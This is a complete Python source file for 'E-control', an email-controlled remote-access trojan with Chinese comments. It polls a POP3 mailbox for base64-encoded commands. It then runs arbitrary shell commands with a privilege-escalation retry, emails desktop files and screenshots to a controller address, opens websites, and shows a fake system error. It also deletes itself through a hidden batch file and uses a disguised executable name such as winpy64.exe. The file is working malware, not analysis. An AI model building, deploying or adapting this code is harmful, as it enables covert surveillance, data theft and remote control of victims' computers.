import os
import sys
import time
import poplib
import email
from email.parser import Parser
from email.header import decode_header
import subprocess
import webbrowser
import logging
import base64
import smtplib
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import platform
import ctypes
import threading
from concurrent.futures import ThreadPoolExecutor, TimeoutError
import queue
import signal
import psutil
import glob
import tempfile
import shutil
import atexit
from PIL import ImageGrab
import uuid

# 配置信息
EMAIL_ACCOUNT = "[受控端邮箱地址]"
EMAIL_PASSWORD = "[受控端邮箱SMTP/POP3授权码]"
POP3_SERVER = "[受控端邮箱POP3服务器地址]"
POP3_PORT = 110  #端口号
CHECK_INTERVAL = 300  # 检查邮件间隔时间（秒）

# 命令执行配置
COMMAND_TIMEOUT = 50  # 命令执行超时时间（秒）
MAX_WORKERS = 5  # 最大并发命令数

# SMTP配置
SMTP_SERVER = "[受控端邮箱SMTP服务器地址]"
SMTP_PORT = 25  #端口号
RESULT_EMAIL = "[控制端邮箱地址]"

# 设备信息
DEVICE_NAME = platform.node().replace(' ', '_')  # 设备名称，替换空格为下划线

# 权限配置
ADMIN_ERROR_MESSAGES = [
    "Access is denied",
    "拒绝访问",
    "管理员",
    "需要提升权限",
    "权限不足"
]

# 重试配置
MAX_RETRIES = 3
RETRY_DELAY = 10  # 重试间隔（秒）

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)

def decode_str(s):
    """解码邮件主题或内容"""
    if not s:
        return ""
    if isinstance(s, bytes):
        try:
            s = s.decode('utf-8')
        except UnicodeDecodeError:
            try:
                s = s.decode('gbk')
            except:
                return "无法解码的内容"
    return s

def parse_email(msg):
    """解析邮件内容"""
    maintype = msg.get_content_maintype()
    if maintype == 'multipart':
        for part in msg.get_payload():
            if part.get_content_maintype() == 'text':
                content = decode_str(part.get_payload())
                try:
                    content = base64.b64decode(content).decode('utf-8')
                    logging.info(f"命令已成功解码为: {content}")
                    return content
                except Exception as e:
                    logging.error(f"base64解码失败: {str(e)}")
                    return f"错误: base64解码失败 - {str(e)}"
    elif maintype == 'text':
        content = decode_str(msg.get_payload())
        try:
            content = base64.b64decode(content).decode('utf-8')
            logging.info(f"命令已成功解码为: {content}")
            return content
        except Exception as e:
            logging.error(f"base64解码失败: {str(e)}")
            return f"错误: base64解码失败 - {str(e)}"
    return ""

def send_command_result(command, result, is_file=False, filename=None):
    """发送命令执行结果到指定邮箱"""
    try:
        # 获取系统信息
        hostname = platform.node()
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # 构建邮件内容
        if is_file:
            mail_content = f"""
文件操作结果报告
------------------

设备名称: {hostname}
执行时间: {current_time}
操作命令: {command}

操作结果:
{result}

------------------
由E-control自动发送
"""
            subject = f'文件操作结果 - {hostname} - {current_time}'
        else:
            mail_content = f"""
命令执行结果报告
------------------

设备名称: {hostname}
执行时间: {current_time}
执行命令: {command}

命令输出:
{result}

------------------
由E-control自动发送
"""
            subject = f'命令执行结果 - {hostname} - {current_time}'
        
        # 创建邮件
        if is_file:
            msg = MIMEMultipart()
            text_part = MIMEText(mail_content, 'plain', 'utf-8')
            msg.attach(text_part)
            
            # 添加附件
            if filename and os.path.exists(filename):
                with open(filename, 'rb') as f:
                    part = MIMEApplication(f.read(), Name=os.path.basename(filename))
                    part['Content-Disposition'] = f'attachment; filename="{os.path.basename(filename)}"'
                    msg.attach(part)
        else:
            msg = MIMEText(mail_content, 'plain', 'utf-8')
        
        msg['From'] = EMAIL_ACCOUNT
        msg['To'] = RESULT_EMAIL
        msg['Subject'] = subject
        
        # 发送邮件
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.login(EMAIL_ACCOUNT, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ACCOUNT, RESULT_EMAIL, msg.as_string())
            
        logging.info(f"结果已发送到: {RESULT_EMAIL}")
        return True
    except Exception as e:
        logging.error(f"发送结果失败: {str(e)}")
        return False

def is_admin():
    """检查是否具有管理员权限"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin(command):
    """以管理员权限运行命令"""
    try:
        # 使用ShellExecuteW以管理员权限运行
        ctypes.windll.shell32.ShellExecuteW(
            None,  # hwnd
            "runas",  # lpOperation
            "cmd.exe",  # lpFile
            f"/c {command}",  # lpParameters
            None,  # lpDirectory
            1  # nShowCmd (SW_SHOWNORMAL)
        )
        return "命令已发送到管理员权限进程"
    except Exception as e:
        return f"以管理员权限运行失败: {str(e)}"

def terminate_process(process):
    try:
        parent = psutil.Process(process.pid)
        children = parent.children(recursive=True)
        for child in children:
            try:
                child.terminate()
            except psutil.NoSuchProcess:
                continue
        try:
            process.terminate()
            process.wait(timeout=5)
        except psutil.NoSuchProcess:
            pass
        except psutil.TimeoutExpired:
            process.kill()
            
        logging.info(f"进程已终止: PID={process.pid}")
        return True
    except Exception as e:
        logging.error(f"终止进程失败: {str(e)}")
        return False

def execute_command(command):
    """执行命令行命令"""
    try:
        command = command.strip()
        
        if sys.platform.startswith('win'):
            if command.lower().startswith('dir'):
                command = command.replace('/', '\\')
            elif command.lower().startswith('ipconfig'):
                command = 'ipconfig /all'
            
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        try:
            stdout, stderr = process.communicate(timeout=COMMAND_TIMEOUT)
            
            if process.returncode != 0:
                error_msg = stderr.strip() if stderr else ""
                if any(msg in error_msg.lower() for msg in ADMIN_ERROR_MESSAGES):
                    if not is_admin():
                        logging.info("检测到权限不足，尝试以管理员权限运行命令")
                        result = run_as_admin(command)
                        if result:
                            send_command_result(command, result)
                            return result
                        return f"以管理员权限执行失败: {result}"
                    return f"命令执行失败: {error_msg}"
                else:
                    return f"命令执行失败: {error_msg}"
                    
            output = stdout.strip()
            if stderr:
                output += f"\n错误信息: {stderr.strip()}"
                
            send_command_result(command, output)
            return output
            
        except subprocess.TimeoutExpired:
            error_msg = f"命令执行超时: 超过 {COMMAND_TIMEOUT} 秒未完成"
            logging.warning(error_msg)
            
            terminate_process(process)

            send_command_result(command, error_msg)
            return error_msg
            
        except Exception as e:
            try:
                terminate_process(process)
            except:
                pass
            
            error_msg = f"命令执行异常: {str(e)}"
            send_command_result(command, error_msg)
            return error_msg
    except Exception as e:
        error_msg = f"命令执行异常: {str(e)}"
        send_command_result(command, error_msg)
        return error_msg

def execute_command_thread(command):
    try:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            future = executor.submit(execute_command, command)
            try:
                result = future.result(timeout=COMMAND_TIMEOUT)
                return result
            except TimeoutError:
                error_msg = f"命令执行超时: 超过 {COMMAND_TIMEOUT} 秒未完成"
                send_command_result(command, error_msg)
                return error_msg
            except Exception as e:
                error_msg = f"线程执行异常: {str(e)}"
                send_command_result(command, error_msg)
                return error_msg
    except Exception as e:
        error_msg = f"线程池执行异常: {str(e)}"
        send_command_result(command, error_msg)
        return error_msg

def open_website(url):
    try:
        url = url.strip()
        if not url.lower().startswith(('http://', 'https://')):
            url = f"https://{url}"
            
        webbrowser.open(url)
        return f"正在打开网站: {url}"
    except Exception as e:
        return f"打开网站失败: {str(e)}"

def process_email_content(content):
    """处理邮件内容，解析命令"""
    content = content.strip()
    logging.info(f"解码后的命令内容: {content}")
    
    if not content:
        return "命令为空"
    
    if content.startswith("cmd+"):
        command = content[4:].strip()
        if not command:
            return "命令为空"
            
        try:
            result = execute_command(command)
            logging.info(f"命令执行成功: {command}")
            logging.info(f"命令输出: {result}")
            return result
        except Exception as e:
            error_msg = f"命令执行失败: {command} - {str(e)}"
            logging.error(error_msg)
            return error_msg
    
    elif content.startswith("website+"):
        url = content[8:].strip()
        if not url:
            return "网址为空"

        if not url.lower().startswith(('http://', 'https://')):
            url = f"https://{url}"
            
        result = open_website(url)
        logging.info(f"网站打开结果: {result}")
        return result
    
    return "未知的命令格式"

def send_startup_info():
    """发送程序启动信息"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # 构建启动信息
        mail_content = f"""
设备启动通知
------------------

设备名称: {DEVICE_NAME}
启动时间: {current_time}

系统信息:
操作系统: {platform.system()} {platform.release()}
处理器架构: {platform.machine()}
Python版本: {platform.python_version()}

------------------
由E-control自动发送
"""

        msg = MIMEText(mail_content, 'plain', 'utf-8')
        msg['From'] = EMAIL_ACCOUNT
        msg['To'] = RESULT_EMAIL
        msg['Subject'] = f'设备启动通知 - {DEVICE_NAME} - {current_time}'

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.login(EMAIL_ACCOUNT, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ACCOUNT, RESULT_EMAIL, msg.as_string())
            
        logging.info(f"启动信息已发送到: {RESULT_EMAIL}")
        return True
    except Exception as e:
        logging.error(f"发送启动信息失败: {str(e)}")
        return False

def parse_device_command(content):
    """解析设备定向命令
    
    支持格式: to+设备名+指令
    """
    # 检查是否为定向命令格式
    if content.lower().startswith('to+'):
        parts = content.split('+', 2)  
        if len(parts) == 3:
            target_device = parts[1].strip()
            command = parts[2].strip()
            return target_device, command
    return None, content

def list_desktop_files():
    """文件操作"""
    try:
        desktop_path = os.path.expanduser("~/Desktop")
        if not os.path.exists(desktop_path):
            return "找不到桌面目录"

        files = []
        for item in os.listdir(desktop_path):
            full_path = os.path.join(desktop_path, item)
            try:
                if os.path.isfile(full_path):
                    size = os.path.getsize(full_path)
                    files.append(f"文件: {item} ({size} bytes)")
                elif os.path.isdir(full_path):
                    files.append(f"目录: {item}")
            except Exception as e:
                logging.error(f"获取文件信息失败: {item} - {str(e)}")
                continue
                
        if not files:
            return "桌面目录为空"

        send_command_result("file+list", "\n".join(files), is_file=False)
        return "文件列表已发送到邮箱"
    except Exception as e:
        error_msg = f"获取桌面文件列表失败: {str(e)}"
        send_command_result("file+list", error_msg, is_file=False)
        return error_msg


def list_folder_files(folder_name):
    """文件操作"""
    try:
        desktop_path = os.path.expanduser("~/Desktop")
        folder_path = os.path.join(desktop_path, folder_name)
        
        if not os.path.exists(folder_path):
            error_msg = f"文件夹不存在: {folder_name}"
            send_command_result(f"file+{folder_name}", error_msg, is_file=False)
            return error_msg
            
        if not os.path.isdir(folder_path):
            error_msg = f"不是文件夹: {folder_name}"
            send_command_result(f"file+{folder_name}", error_msg, is_file=False)
            return error_msg

        files = []
        for item in os.listdir(folder_path):
            full_path = os.path.join(folder_path, item)
            try:
                if os.path.isfile(full_path):
                    size = os.path.getsize(full_path)
                    files.append(f"文件: {item} ({size} bytes)")
                elif os.path.isdir(full_path):
                    files.append(f"目录: {item}")
            except Exception as e:
                logging.error(f"获取文件信息失败: {item} - {str(e)}")
                continue
                
        if not files:
            return f"文件夹 {folder_name} 为空"

        send_command_result(f"file+{folder_name}", "\n".join(files), is_file=False)
        return "文件夹内容已发送到邮箱"
    except Exception as e:
        error_msg = f"获取文件夹内容失败: {str(e)}"
        send_command_result(f"file+{folder_name}", error_msg, is_file=False)
        return error_msg


def send_file_from_folder(folder_name, filename):
    """文件发送"""
    try:
        desktop_path = os.path.expanduser("~/Desktop")
        folder_path = os.path.join(desktop_path, folder_name)
        file_path = os.path.join(folder_path, filename)
        
        if not os.path.exists(folder_path):
            error_msg = f"文件夹不存在: {folder_name}"
            send_command_result(f"file+{folder_name}+{filename}", error_msg, is_file=False)
            return error_msg
            
        if not os.path.exists(file_path):
            error_msg = f"文件不存在: {filename}"
            send_command_result(f"file+{folder_name}+{filename}", error_msg, is_file=False)
            return error_msg
            
        if os.path.getsize(file_path) > 20 * 1024 * 1024:  # 20MB限制
            error_msg = f"文件过大: {filename} ({os.path.getsize(file_path)} bytes)"
            send_command_result(f"file+{folder_name}+{filename}", error_msg, is_file=False)
            return error_msg
            
        result = send_command_result(f"file+{folder_name}+{filename}", "文件发送中...", is_file=True, filename=file_path)
        if result:
            return f"文件 {filename} 已发送到 {RESULT_EMAIL}"
        else:
            return "发送文件失败"
    except Exception as e:
        error_msg = f"发送文件失败: {str(e)}"
        send_command_result(f"file+{folder_name}+{filename}", error_msg, is_file=False)
        return error_msg

def send_desktop_file(filename):
    """文件发送"""
    try:
        desktop_path = os.path.expanduser("~/Desktop")
        file_path = os.path.join(desktop_path, filename)
        
        if not os.path.exists(file_path):
            error_msg = f"文件不存在: {filename}"
            send_command_result(f"file+{filename}", error_msg, is_file=False)
            return error_msg
            
        if not os.path.isfile(file_path):  # 确保是文件
            error_msg = f"不是文件: {filename}"
            send_command_result(f"file+{filename}", error_msg, is_file=False)
            return error_msg
            
        if os.path.getsize(file_path) > 20 * 1024 * 1024:  # 20MB限制
            error_msg = f"文件过大: {filename} ({os.path.getsize(file_path)} bytes)"
            send_command_result(f"file+{filename}", error_msg, is_file=False)
            return error_msg

        result = send_command_result(f"file+{filename}", "文件发送中...", is_file=True, filename=file_path)
        if result:
            return f"文件 {filename} 已发送到 {RESULT_EMAIL}"
        else:
            return "发送文件失败"
    except Exception as e:
        error_msg = f"发送文件失败: {str(e)}"
        send_command_result(f"file+{filename}", error_msg, is_file=False)
        return error_msg

def send_offline_notification():
    """发送下线通知"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        hostname = platform.node()

        mail_content = f"""
设备下线通知
------------------

设备名称: {hostname}
下线时间: {current_time}

设备已收到关机指令并即将关闭。

------------------
由E-control自动发送
"""
        msg = MIMEText(mail_content, 'plain', 'utf-8')
        msg['From'] = EMAIL_ACCOUNT
        msg['To'] = RESULT_EMAIL
        msg['Subject'] = f'设备下线通知 - {hostname} - {current_time}'

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.login(EMAIL_ACCOUNT, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ACCOUNT, RESULT_EMAIL, msg.as_string())
            
        logging.info(f"下线通知已发送到: {RESULT_EMAIL}")
        return True
    except Exception as e:
        logging.error(f"发送下线通知失败: {str(e)}")
        return False

def process_email_content(content):
    """我不希望我的代码可以被敌人直接使用"""
    content = content.strip()
    logging.info(f"解码后的命令内容: {content}")

    if not content:
        return "命令为空"

    target_device, command = parse_device_command(content)

    if target_device and target_device != DEVICE_NAME:
        logging.info(f"忽略非本机设备命令: 目标设备={target_device}, 本机设备={DEVICE_NAME}")
        return f"忽略非本机设备命令 - 目标设备: {target_device}"

    if command.lower() == 'poweroff':
        logging.info("收到关机指令，准备关闭程序...")
        return "POWEROFF_COMMAND"

    if command.lower() == 'b':
        bilibili_url = "https://player.bilibili.com/player.html?isOutside=true&aid=1706416465&bvid=BV1UT42167xb&cid=1641702404&p=1&noFullScreenButton=0&danmaku=0&muted=1&hideCoverInfo=0"
        logging.info(f"收到B站视频快捷命令，即将打开: {bilibili_url}")
        result = open_website(bilibili_url)
        return f"已打开B站视频: {result}"
        
    if command.lower() == 'a':
        error_msg = "关键运行库丢失，应用程序无法正常运行(0xc000007b)"
        logging.info(f"收到显示错误消息命令，内容: {error_msg}")
        try:
            subprocess.run(f'msg %username% /time:100 "{error_msg}"', shell=True, check=True)
            return f"已显示错误消息: {error_msg}"
        except subprocess.CalledProcessError as e:
            error = f"显示错误消息失败: {str(e)}"
            logging.error(error)
            return error
            
    if command.lower() == 'remove':
        logging.info("收到自毁指令，准备删除程序...")
        try:
            exe_path = os.path.abspath(sys.argv[0])
            script_dir = os.path.dirname(exe_path)
            exe_name = os.path.basename(exe_path).lower()
            
            send_command_result(
                command="remove",
                result=f"正在删除程序文件: {exe_path}"
            )
            
            batch_script = os.path.join(script_dir, 'remove_self.bat')
            with open(batch_script, 'w', encoding='gbk') as f:
                f.write('@echo off\n')
                f.write('chcp 65001 >nul\n')  
                f.write('echo 正在清理程序文件，请稍候...\n')
                f.write('timeout /t 3 /nobreak >nul\n')  
                
                if exe_name == 'winpy64.exe':
                    f.write(f'taskkill /f /im winpy64.exe >nul 2>&1\n')
                    f.write(f'del /f /q "{exe_path}"\n')
                    f.write(f'del /f /q "{os.path.join(script_dir, "winpy64.*")}"\n')
                else:
                    f.write(f'taskkill /f /im "{exe_name}" >nul 2>&1\n')
                    f.write(f'del /f /q "{exe_path}"\n')
                    f.write(f'del /f /q "{os.path.splitext(exe_path)[0]}.*"\n')
                
                f.write(f'del /f /q "{batch_script}"\n')
                f.write('exit\n')
            
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(
                batch_script,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            return "SELF_DESTRUCT_COMMAND"
            
        except Exception as e:
            error_msg = f"自毁程序执行失败: {str(e)}"
            logging.error(error_msg)
            return error_msg
            
    if command.lower() == 'screen':
        logging.info("收到截屏命令，正在获取屏幕截图...")
        try:
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
                screenshot_path = temp_file.name

            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path, 'PNG')
            logging.info(f"截图已保存到: {screenshot_path}")

            result = send_command_result(
                command="screen_capture",
                result="屏幕截图已捕获并作为附件发送",
                is_file=True,
                filename=screenshot_path
            )

            try:
                os.unlink(screenshot_path)
                logging.info(f"已删除临时截图文件: {screenshot_path}")
            except Exception as e:
                logging.error(f"删除临时文件失败: {str(e)}")
            
            return "屏幕截图已发送"
            
        except Exception as e:
            error_msg = f"截屏失败: {str(e)}"
            logging.error(error_msg)
            return error_msg

    if command.startswith("cmd+"):
        command = command[4:].strip()
        if not command:
            return "命令为空"
  
        try:
            result = execute_command_thread(command)
            logging.info(f"命令执行成功: {command}")
            logging.info(f"命令输出: {result}")
            return result
        except Exception as e:
            error_msg = f"命令执行失败: {command} - {str(e)}"
            logging.error(error_msg)
            return error_msg

    elif command.startswith("website+"):
        url = command[8:].strip()
        if not url:
            return "网址为空"

        if not url.lower().startswith(('http://', 'https://')):
            url = f"https://{url}"
            
        result = open_website(url)
        logging.info(f"网站打开结果: {result}")
        return result

    elif command.startswith("file+"):
        action = command[5:].strip()
        if not action:
            return "文件操作命令为空"

        if action.lower() == "list":
            return list_desktop_files()

        parts = action.split('+')
        if len(parts) == 2: 
            folder_name = parts[0].strip()
            filename = parts[1].strip()
            if not folder_name or not filename:
                return "文件夹名或文件名为空"
            return send_file_from_folder(folder_name, filename)
        else:  
            name = action.strip()
            if not name:
                return "名称为空"

            desktop_path = os.path.expanduser("~/Desktop")
            item_path = os.path.join(desktop_path, name)

            if os.path.exists(item_path):
                if os.path.isdir(item_path):
                    return list_folder_files(name)
                elif os.path.isfile(item_path):
                    return send_desktop_file(name)
            else:
                return f"项目不存在: {name}"
    
    return "未知的命令格式"

def main():
    print("邮件控制器已启动，正在监听命令...")
    logging.info("邮件控制器已启动")

    send_startup_info()
    
    retry_count = 0
    
    while True:
        try:
            print(f"正在连接到POP3服务器: {POP3_SERVER}")
            logging.info(f"正在连接到POP3服务器: {POP3_SERVER}")
            
            server = poplib.POP3(POP3_SERVER, POP3_PORT)
            print("正在登录邮箱...")
            logging.info("正在登录邮箱...")
            
            resp = server.getwelcome().decode('utf-8')
            print(f"服务器响应: {resp}")
            logging.info(f"服务器响应: {resp}")

            server.user(EMAIL_ACCOUNT)
            server.pass_(EMAIL_PASSWORD)
            
            email_list = server.list()[1]
            email_count = len(email_list)
            print(f"邮箱中有 {email_count} 封新邮件")
            logging.info(f"邮箱中有 {email_count} 封新邮件")

            should_shutdown = False
            should_self_destruct = False

            for i in range(1, email_count + 1):
                try:
                    print(f"正在处理第 {i} 封邮件...")
                    logging.info(f"正在处理第 {i} 封邮件...")

                    resp, lines, octets = server.retr(i)
                    msg_content = b'\r\n'.join(lines).decode('utf-8')
                    msg = Parser().parsestr(msg_content)

                    content = parse_email(msg)
                    logging.info(f"收到新命令: {content}")
     
                    target_device, command = parse_device_command(content)
                    is_local_command = (not target_device) or (target_device == DEVICE_NAME)
                    
                    result = process_email_content(content)
                    logging.info(f"命令执行结果: {result}")
    
                    if result == "POWEROFF_COMMAND":
                        should_shutdown = True
                        print("检测到关机命令，将在处理完所有邮件后执行")
                        logging.info("检测到关机命令，将在处理完所有邮件后执行")
                        server.dele(i) 
                        print(f"第 {i} 封邮件(关机命令)处理完成，已标记为删除")
                        logging.info(f"第 {i} 封邮件(关机命令)处理完成，已标记为删除")
                    elif result == "SELF_DESTRUCT_COMMAND":
                        should_self_destruct = True
                        server.dele(i)  
                        print(f"第 {i} 封邮件(自毁命令)处理完成，已标记为删除")
                        logging.info(f"第 {i} 封邮件(自毁命令)处理完成，已标记为删除")
                    elif is_local_command or result != f"忽略非本机设备命令 - 目标设备: {target_device}":
                        server.dele(i)
                        print(f"第 {i} 封邮件处理完成，已标记为删除")
                        logging.info(f"第 {i} 封邮件处理完成，已标记为删除")
                    else:
                        print(f"第 {i} 封邮件是非本机命令，保留邮件")
                        logging.info(f"第 {i} 封邮件是非本机命令，保留邮件")
                    
                except Exception as e:
                    error_msg = f"处理第 {i} 封邮件时出错: {str(e)}"
                    print(error_msg)
                    logging.error(error_msg)
                    continue  

            if should_self_destruct:
                print("正在执行自毁程序...")
                logging.info("正在执行自毁程序...")
                server.quit() 
                print("程序即将自毁...")
                logging.info("程序即将自毁...")
                os._exit(0)  
            elif should_shutdown:
                print("正在发送下线通知...")
                logging.info("正在发送下线通知...")
                send_offline_notification()
                print("程序即将关闭...")
                logging.info("程序即将关闭...")
                server.quit()
                sys.exit(0)
                
            server.quit()
            retry_count = 0  
            
        except Exception as e:
            retry_count += 1
            error_message = str(e)
            print(f"处理邮件时出错: {error_message}")
            logging.error(f"处理邮件时出错: {error_message}")
            
            if retry_count >= MAX_RETRIES:
                print(f"达到最大重试次数({MAX_RETRIES})，等待 {CHECK_INTERVAL} 秒后重试...")
                logging.error(f"达到最大重试次数({MAX_RETRIES})，等待 {CHECK_INTERVAL} 秒后重试...")
                retry_count = 0
            else:
                print(f"第 {retry_count} 次重试，等待 {RETRY_DELAY} 秒后重试...")
                logging.error(f"第 {retry_count} 次重试，等待 {RETRY_DELAY} 秒后重试...")
                time.sleep(RETRY_DELAY)
            
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
